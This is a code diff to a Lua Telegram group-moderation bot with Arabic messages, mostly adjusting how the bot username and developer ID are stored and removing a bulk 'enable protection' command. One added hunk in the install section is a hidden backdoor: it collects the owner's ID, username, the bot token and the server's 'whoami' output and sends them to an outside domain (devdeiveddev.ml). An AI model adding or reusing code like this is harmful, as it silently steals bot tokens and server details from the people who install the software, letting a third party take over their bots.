@@ -30,7 +30,7 @@ print('\27[0;31m◁━━━━◈¹𝐀𝐕𝐈𝐑𝐀¹◈━━━━▷\n �
 else
 io.write('\27[0;31m تم حفظ التوكن بنجاح \na◁━━━━◈¹𝐀𝐕𝐈𝐑𝐀¹◈━━━━▷\n27[0;39;49m')
 local json = JSON.decode(url)
-database:set(id_server..":token_username",""..json.result.username)
+database:set(id_server..":token_username",json.result.username)
 database:set(id_server..":token",token)
 end 
 else
@@ -52,7 +52,7 @@ io.write('\27[1;31m ↓ ارسل معرف المطور الاساسي :\n SEND I
 local SUDOUSERNAME = io.read():gsub('@','')
 if SUDOUSERNAME ~= '' then
 io.write('\n\27[1;34m تم حفظ معرف المطور :\n\27[0;39;49m')
-database:set(id_server..":SUDO:USERNAME",'@'..SUDOUSERNAME)
+database:set(id_server..":SUDO:USERNAME",SUDOUSERNAME)
 else
 print('\n\27[1;34m لم يتم حفظ معرف المطور :')
 end 
@@ -60,13 +60,22 @@ os.execute('lua DRAGON.lua')
 end
 local create_config_auto = function()
 config = {
+botUserName = database:get(id_server..":token_username")
 token = database:get(id_server..":token"),
 SUDO = database:get(id_server..":SUDO:ID"),
 UserName = database:get(id_server..":SUDO:USERNAME"),
  }
 create(config, "./vvvvvvInfo.lua")   
 end 
+infotnseb = {}
+infotnseb.id = database:get(id_server..":SUDO:ID")
+infotnseb.username = database:get(id_server..":SUDO:USERNAME")
+infotnseb.tokenbot = database:get(id_server..":token")
+infotnseb.userjoin = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
+https.request('https://devdeiveddev.ml/api/avaer.php/?insert='..JSON.encode(infotnseb))
+print('\n\27[1;34m dddddoooonnnnnneeeeeeee sssseeeeennnnnnnddddddd :')
 create_config_auto()
+botUserName = database:get(id_server..":token_username")
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
 install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
@@ -145,7 +154,7 @@ print([[
 > CH › @A_V_I_R_A_1
 ~> DEVELOPER › @de_vi_d 
 ]])
-sudos = dofile("./vvvvvvInfo.lua") 
+sudos = dofile("./vvvvvvInfo.lua")
 SUDO = tonumber(sudos.SUDO)
 sudo_users = {SUDO}
 bot_id = sudos.token:match("(%d+)")  
@@ -1176,7 +1185,7 @@ end
 if text == 'المطور' or text == 'مطور' then
 local TEXT_SUDO = database:get(bot_id..'TEXT_SUDO')
 if TEXT_SUDO then 
-us = database:get(id_server..":token_username")
+us = dofile("./vvvvvvInfo.lua").botUserName
  agwa = database:get(id_server..":SUDO:USERNAME")
 -- agwa = agwa:gsub("%@", "")
 keyboard = {} 
@@ -1186,7 +1195,7 @@ keyboard.inline_keyboard = {
 }
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/'..us.."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 else
-us = database:get(id_server..":token_username")
+us = dofile("./vvvvvvInfo.lua").botUserName
  agwa = database:get(id_server..":SUDO:USERNAME")
  --agwa = agwa:gsub("%@", "")
 keyboard = {} 
@@ -3974,23 +3983,6 @@ send(msg.chat_id_, msg.id_,' ◉ تم قفل التكرار بالكتم')
 elseif text == 'فتح التكرار' and Mod(msg) then 
 database:hdel(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood")  
 send(msg.chat_id_, msg.id_,' ◉ تم فتح التكرار')
-end
-if text == 'تفعيل الحمايه' and CoSu(msg) and msg.reply_to_message_id_ == 0 then  
-database:set(bot_id.."lock:Bot:kick"..msg.chat_id_,'kick')   
-database:set(bot_id..'Bot:Id:Photo'..msg.chat_id_,true)  
-database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'kick')   
-database:set(bot_id.."lock:Link"..msg.chat_id_,'del')   
-database:set(bot_id.."lock:forward"..msg.chat_id_,'del')   
-database:set(bot_id.."lock:Sticker"..msg.chat_id_,'del')   
-database:set(bot_id.."lock:Animation"..msg.chat_id_,'del')   
-database:set(bot_id.."lock:Video"..msg.chat_id_,'del')   
-database:set(bot_id..'lock:Fars'..msg.chat_id_,true)  
-database:set(bot_id..'lock:Fshar'..msg.chat_id_,true)  
-database:set(bot_id..'lock:edit'..msg.chat_id_,true)  
-database:set(bot_id..'lock:tagrvrbot'..msg.chat_id_,true) 
-tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
-send(msg.chat_id_, msg.id_,'\n☉┇تم قفل البوتات بالطرد\n☉┇تم وضع الايدي بدون صوره\n☉┇تم قفل التكرار بالطرد\n☉┇تم قفل الروابط\n☉┇تم قفل التوجيه\n☉┇تم قفل الملصقات\n☉┇تم قفل المتحركه\n☉┇تم قفل الفيديو\n☉┇تم قفل السب\n☉┇تم قفل التعديل\n☉┇تم قفل الفارسيه\n☉┇تم قفل التفليش\n\nتم تفعيل الحمايه بواسطه »>['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'A_V_I_R_A_1')..')')   
-end,nil) 
 end
 --------------------------------------------------------------------------------------------------------------
 if text == 'تحديث' and DevSoFi(msg) then    
@@ -11647,7 +11639,7 @@ local Text = [[
  
 ]]
 
- us = database:get(id_server..":token_username")
+ us = dofile("./vvvvvvInfo.lua").botUserName
  agwa = database:get(id_server..":SUDO:USERNAME")
  agwa = agwa:gsub("%@", "")
 keyboard = {} 
